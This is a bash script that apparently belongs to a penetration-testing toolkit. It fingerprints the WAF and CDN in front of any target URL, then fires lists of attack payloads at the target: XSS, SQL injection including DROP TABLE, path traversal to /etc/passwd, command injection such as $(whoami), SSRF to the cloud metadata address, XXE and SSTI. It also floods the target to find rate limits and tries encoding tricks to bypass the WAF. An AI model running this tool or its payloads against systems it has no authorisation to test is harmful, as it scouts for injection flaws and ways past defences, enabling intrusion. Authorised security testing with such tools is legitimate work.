#!/bin/bash
# waf_detect.sh — WAF / Security Layer Fingerprinting
#
# Identifies WAF, CDN, rate limiting, and security layers protecting the target.
# Tests which characters/payloads are blocked, identifies bypass opportunities.
#
# Usage: ./waf_detect.sh <target-url> [--auth-cookie "..."] [--header "..."] [--output-dir <dir>]

set -e

TARGET=""
AUTH_COOKIE=""
EXTRA_HEADER=""
OUTPUT_DIR="engagement/spider/waf"

while [[ $# -gt 0 ]]; do
    case $1 in
        --auth-cookie) AUTH_COOKIE="$2"; shift 2 ;;
        --header) EXTRA_HEADER="$2"; shift 2 ;;
        --output-dir) OUTPUT_DIR="$2"; shift 2 ;;
        *) TARGET="$1"; shift ;;
    esac
done

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target-url> [--auth-cookie ...] [--header ...] [--output-dir ...]"
    exit 1
fi

TARGET="${TARGET%/}"
mkdir -p "$OUTPUT_DIR"

CURL_ARGS=(-s -i -L --max-time 10 -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
[ -n "$AUTH_COOKIE" ] && CURL_ARGS+=(-b "$AUTH_COOKIE")
[ -n "$EXTRA_HEADER" ] && CURL_ARGS+=(-H "$EXTRA_HEADER")

WAF_RESULTS="$OUTPUT_DIR/waf_fingerprint.json"

echo "================================================="
echo "  WAF / SECURITY LAYER DETECTION"
echo "================================================="
echo "  Target:  $TARGET"
echo "  Output:  $WAF_RESULTS"
echo "================================================="
echo ""

echo "[1/5] Header fingerprinting..."

HEADERS_FILE="$OUTPUT_DIR/response_headers.txt"
curl "${CURL_ARGS[@]}" "$TARGET/" > "$HEADERS_FILE" 2>/dev/null || true

WAF_NAME="unknown"
CDN_NAME="unknown"
WAF_EVIDENCE=""

if grep -qi "cloudflare" "$HEADERS_FILE" 2>/dev/null; then
    WAF_NAME="cloudflare"
    CDN_NAME="cloudflare"
    WAF_EVIDENCE="cf-ray header or server: cloudflare"
fi
if grep -qi "aws waf\|x-amzn\|awsalb" "$HEADERS_FILE" 2>/dev/null; then
    WAF_NAME="aws-waf"
    WAF_EVIDENCE="x-amzn headers"
fi
if grep -qi "akamai" "$HEADERS_FILE" 2>/dev/null; then
    CDN_NAME="akamai"
    WAF_EVIDENCE="akamai headers"
fi
if grep -qi "imperva\|incapsula\|x-cdn: imperva" "$HEADERS_FILE" 2>/dev/null; then
    WAF_NAME="imperva"
    WAF_EVIDENCE="imperva/incapsula indicators"
fi
if grep -qi "sucuri" "$HEADERS_FILE" 2>/dev/null; then
    WAF_NAME="sucuri"
    WAF_EVIDENCE="sucuri indicators"
fi
if grep -qi "fastly" "$HEADERS_FILE" 2>/dev/null; then
    CDN_NAME="fastly"
fi
if grep -qi "x-sucuri-id\|x-sucuri-cache" "$HEADERS_FILE" 2>/dev/null; then
    WAF_NAME="sucuri"
fi
if grep -qi "azure\|frontdoor\|azurefd" "$HEADERS_FILE" 2>/dev/null; then
    CDN_NAME="azure-frontdoor"
fi
if grep -qi "x-powered-by-plesk\|x-powered-by.*asp" "$HEADERS_FILE" 2>/dev/null; then
    WAF_EVIDENCE+=" plesk/asp detected"
fi

echo "   WAF: $WAF_NAME"
echo "   CDN: $CDN_NAME"
echo "   Evidence: $WAF_EVIDENCE"

echo ""
echo "[2/5] Response-based WAF detection..."

WAF_PAGE_TEST=$(curl "${CURL_ARGS[@]}" "$TARGET/?test=<script>alert(1)</script>" 2>/dev/null)
WAF_PAGE_STATUS=$(echo "$WAF_PAGE_TEST" | head -1 | awk '{print $2}')
WAF_BLOCKED="false"
WAF_BLOCK_RESPONSE=""

if [ "$WAF_PAGE_STATUS" = "403" ] || [ "$WAF_PAGE_STATUS" = "406" ] || [ "$WAF_PAGE_STATUS" = "429" ]; then
    WAF_BLOCKED="true"
    WAF_BLOCK_RESPONSE=$(echo "$WAF_PAGE_TEST" | grep -i "blocked\|denied\|forbidden\|security\|firewall\|waf\|challenge" | head -3)
    echo "   WAF blocked XSS probe: YES (status $WAF_PAGE_STATUS)"
    echo "   Block page hints: $WAF_BLOCK_RESPONSE"
else
    echo "   WAF blocked XSS probe: NO (status $WAF_PAGE_STATUS)"
fi

echo ""
echo "[3/5] Character-level block testing..."

BLOCKED_CHARS_FILE="$OUTPUT_DIR/blocked_chars.txt"
> "$BLOCKED_CHARS_FILE"

TEST_CHARS=(
    "<script>alert(1)</script>|xss_script"
    "' OR 1=1--|sqli_basic"
    "\" OR 1=1--|sqli_double"
    "'; DROP TABLE--|sqli_drop"
    "UNION SELECT 1,2,3|sqli_union"
    "../../../etc/passwd|path_traversal"
    "{{7*7}}|ssti_jinja"
    "\${7*7}|ssti_freemarker"
    "<img src=x onerror=alert(1)>|xss_img"
    "javascript:alert(1)|xss_js_proto"
    "<svg/onload=alert(1)>|xss_svg"
    "eval(atob('YWxlcnQoMSk='))|xss_eval"
    "; ls -la|cmd_injection"
    "| cat /etc/passwd|cmd_pipe"
    "\`id\`|cmd_backtick"
    "\$(whoami)|cmd_subshell"
    "<?php phpinfo(); ?>|php_injection"
    "http://169.254.169.254|ssrf_metadata"
    "http://localhost:22|ssrf_localhost"
    "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>|xxe_entity"
    "__proto__|prototype_pollution"
    "constructor[prototype]|proto_chain"
)

BLOCKED_COUNT=0
ALLOWED_COUNT=0

for test_case in "${TEST_CHARS[@]}"; do
    payload=$(echo "$test_case" | cut -d'|' -f1)
    label=$(echo "$test_case" | cut -d'|' -f2)

    encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null)
    resp=$(curl "${CURL_ARGS[@]}" -o /dev/null -w "%{http_code}|%{size_download}" "$TARGET/?q=${encoded_payload}" 2>/dev/null || echo "000|0")
    status=$(echo "$resp" | cut -d'|' -f1)
    size=$(echo "$resp" | cut -d'|' -f2)

    if [ "$status" = "403" ] || [ "$status" = "406" ] || [ "$status" = "429" ]; then
        echo "BLOCKED|$label|$status|$size|$payload" >> "$BLOCKED_CHARS_FILE"
        BLOCKED_COUNT=$((BLOCKED_COUNT + 1))
        echo "   BLOCKED: $label ($status)"
    else
        echo "ALLOWED|$label|$status|$size" >> "$BLOCKED_CHARS_FILE"
        ALLOWED_COUNT=$((ALLOWED_COUNT + 1))
        echo "   ALLOWED: $label ($status)"
    fi
    sleep 0.3 2>/dev/null || true
done

echo ""
echo "[4/5] Rate limit detection..."

RATE_LIMIT_HIT="false"
RATE_LIMIT_THRESHOLD=""

for i in $(seq 1 30); do
    resp=$(curl "${CURL_ARGS[@]}" -o /dev/null -w "%{http_code}" "$TARGET/" 2>/dev/null || echo "000")
    if [ "$resp" = "429" ] || [ "$resp" = "503" ]; then
        RATE_LIMIT_HIT="true"
        RATE_LIMIT_THRESHOLD="$i requests"
        echo "   Rate limit hit after $i rapid requests (status $resp)"
        break
    fi
done

if [ "$RATE_LIMIT_HIT" = "false" ]; then
    echo "   No rate limit detected in 30 rapid requests"
fi

echo ""
echo "[5/5] Bypass technique testing..."

BYPASS_FILE="$OUTPUT_DIR/bypass_tests.txt"
> "$BYPASS_FILE"

BYPASS_TESTS=(
    "case_variation|<ScRiPt>alert(1)</ScRiPt>"
    "unicode_normalize|＜script＞alert(1)＜/script＞"
    "null_byte_prefix|%00<script>alert(1)</script>"
    "double_encode|%253Cscript%253E"
    "newline_inject|%0a<script>alert(1)</script>"
    "tab_inject|%09<script>alert(1)</script>"
    "html_entity|&lt;script&gt;alert(1)&lt;/script&gt;"
    "mixed_case_sqli|uNiOn SeLeCt 1,2,3"
    "comment_inject_sqli|UN/**/ION SE/**/LECT"
    "hex_encode_sqli|0x3c7363726970743e"
)

BYPASS_WORKING=0

for test_case in "${BYPASS_TESTS[@]}"; do
    label=$(echo "$test_case" | cut -d'|' -f1)
    payload=$(echo "$test_case" | cut -d'|' -f2)

    resp=$(curl "${CURL_ARGS[@]}" -o /dev/null -w "%{http_code}" "$TARGET/?q=${payload}" 2>/dev/null || echo "000")

    if [ "$resp" != "403" ] && [ "$resp" != "406" ]; then
        echo "WORKS|$label|$resp|$payload" >> "$BYPASS_FILE"
        BYPASS_WORKING=$((BYPASS_WORKING + 1))
        echo "   BYPASS WORKS: $label ($resp)"
    else
        echo "BLOCKED|$label|$resp" >> "$BYPASS_FILE"
        echo "   BYPASS BLOCKED: $label ($resp)"
    fi
    sleep 0.3 2>/dev/null || true
done

echo ""
echo "  Building fingerprint JSON..."

python3 << PYEOF
import json
from datetime import datetime, timezone

blocked_chars = []
allowed_chars = []
with open("$BLOCKED_CHARS_FILE") as f:
    for line in f:
        parts = line.strip().split('|')
        if len(parts) >= 4:
            entry = {
                "label": parts[1],
                "status": int(parts[2]),
                "size": int(parts[3])
            }
            if len(parts) >= 5:
                entry["payload"] = parts[4]
            if parts[0] == "BLOCKED":
                blocked_chars.append(entry)
            else:
                allowed_chars.append(entry)

bypass_tests = []
with open("$BYPASS_FILE") as f:
    for line in f:
        parts = line.strip().split('|')
        if len(parts) >= 3:
            entry = {
                "technique": parts[1],
                "status": int(parts[2]),
                "works": parts[0] == "WORKS"
            }
            if len(parts) >= 4:
                entry["payload"] = parts[3]
            bypass_tests.append(entry)

headers = {}
try:
    with open("$HEADERS_FILE") as f:
        for line in f:
            if ':' in line and not line.startswith('HTTP'):
                key, _, val = line.partition(':')
                headers[key.strip()] = val.strip()
except: pass

output = {
    "meta": {
        "target": "$TARGET",
        "scanned_at": datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z')
    },
    "waf": {
        "name": "$WAF_NAME",
        "evidence": "$WAF_EVIDENCE",
        "blocks_xss_probes": "$WAF_BLOCKED" == "true"
    },
    "cdn": {
        "name": "$CDN_NAME"
    },
    "rate_limiting": {
        "detected": "$RATE_LIMIT_HIT" == "true",
        "threshold": "$RATE_LIMIT_THRESHOLD" if "$RATE_LIMIT_HIT" == "true" else None
    },
    "blocked_payloads": blocked_chars,
    "allowed_payloads": allowed_chars,
    "bypass_tests": bypass_tests,
    "bypass_techniques_working": [t["technique"] for t in bypass_tests if t.get("works")],
    "security_headers": {
        "content_security_policy": headers.get("Content-Security-Policy", headers.get("content-security-policy", "MISSING")),
        "x_frame_options": headers.get("X-Frame-Options", headers.get("x-frame-options", "MISSING")),
        "strict_transport_security": headers.get("Strict-Transport-Security", headers.get("strict-transport-security", "MISSING")),
        "x_content_type_options": headers.get("X-Content-Type-Options", headers.get("x-content-type-options", "MISSING")),
        "referrer_policy": headers.get("Referrer-Policy", headers.get("referrer-policy", "MISSING")),
        "permissions_policy": headers.get("Permissions-Policy", headers.get("permissions-policy", "MISSING"))
    },
    "key_headers": headers
}

with open("$WAF_RESULTS", "w") as f:
    json.dump(output, f, indent=2)

print(f"   WAF: {output['waf']['name']}")
print(f"   CDN: {output['cdn']['name']}")
print(f"   Blocked payloads: {len(blocked_chars)}")
print(f"   Allowed payloads: {len(allowed_chars)}")
print(f"   Bypass techniques working: {len([t for t in bypass_tests if t.get('works')])}")
print(f"   Output: $WAF_RESULTS")
PYEOF

echo ""
echo "================================================="
echo "  WAF DETECTION COMPLETE"
echo "================================================="
echo "  WAF:        $WAF_NAME"
echo "  CDN:        $CDN_NAME"
echo "  Rate limit: ${RATE_LIMIT_HIT} (${RATE_LIMIT_THRESHOLD:-N/A})"
echo "  Blocked:    $BLOCKED_COUNT payloads"
echo "  Bypasses:   $BYPASS_WORKING techniques"
echo "  Output:     $WAF_RESULTS"
echo "================================================="
